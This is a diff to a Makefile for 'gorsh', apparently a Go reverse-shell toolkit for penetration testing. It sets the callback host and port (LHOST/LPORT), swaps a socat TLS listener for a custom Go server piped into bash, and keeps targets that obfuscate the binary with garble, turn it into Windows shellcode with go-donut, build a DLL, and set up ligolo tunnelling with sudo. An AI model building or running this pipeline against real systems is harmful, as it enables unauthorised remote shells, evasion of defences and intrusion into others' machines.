@@ -3,14 +3,15 @@
 ##############
 # used for artifact naming
 APP ?= gorsh
+SERVER = ${OUT}/${APP}-server
 # artifact output directory
-OUT ?= /srv/smb/tools
+OUT ?= build
 # build command prefix
-BUILD = go build -trimpath
+BUILD = go build
 # operation systems to build for
 PLATFORMS = linux windows darwin
 # host the reverse shell will call back to
-LHOST ?= 10.10.14.21
+LHOST ?= localhost
 # port the reverse shell will call back to
 LPORT ?= 8443
 # exfil and staging path to serve over smb
@@ -42,7 +43,6 @@ target = $(word 1, $@)
 LIGOLO = ${HOME}/.local/bin/ligolo
 GODONUT = ${GOPATH}/bin/go-donut
 GARBLE = ${GOPATH}/bin/garble
-SOCAT = $(shell which socat)
 FZF = ${GOPATH}/bin/fzf
 
 
@@ -58,12 +58,12 @@ ${PLATFORMS}: $(SRV_KEY) $(GARBLE) ## one of: windows, linux, darwin
 		-o ${OUT}/${APP}.${target} \
 		cmd/gorsh/main.go
 
-listen: $(SRV_KEY) $(SOCAT) ## starts the socat tls listener that catches callbacks
-	@test -n "$(LPORT)" || (echo "LPORT not defined"; exit 1)
-	${SOCAT} -d \
-		OPENSSL-LISTEN:${LPORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
-		EXEC:scripts/${target}.sh
-		# TCP:10.10.14.21:13338
+$(SERVER): $(SRV_KEY) ## make the listening server
+	${BUILD} \
+		-buildmode pie \
+		-ldflags ${LDFLAGS} \
+		-o ${target} \
+		cmd/gorsh-server/main.go
 
 shellcode: $(GODONUT) windows ## generate PIC windows shellcode
 	${GODONUT} --arch x64 --verbose \
@@ -80,12 +80,15 @@ dll:  ## creates a windows dll. exports are definded in `cmd/gorsh-dll/dllmain.g
 		-o ${OUT}/${APP}.windows.dll \
 		cmd/gorsh-dll/dllmain.go
 
+listen: $(SERVER) ## start listening for callbacks on LPORT
+	$< | bash
+
 ##############
 # LIGOLO MGMT
 ##############
 start-ligolo:  ## configures the necessary tun interfaces and starts ligolo. requires root
-	ip tuntap add user player1 ligolo mode tun
-	ip link set ligolo up
+	sudo ip tuntap add user player1 ligolo mode tun
+	sudo ip link set ligolo up
 	$(LIGOLO) -selfcert
 
 ##############
@@ -156,9 +159,6 @@ $(GARBLE):
 
 $(FZF):
 	go install github.com/junegunn/fzf@latest
-
-$(SOCAT):
-	sudo apt get install socat
 
 $(SRV_KEY) $(SRV_PEM) &:
 	mkdir -p certs
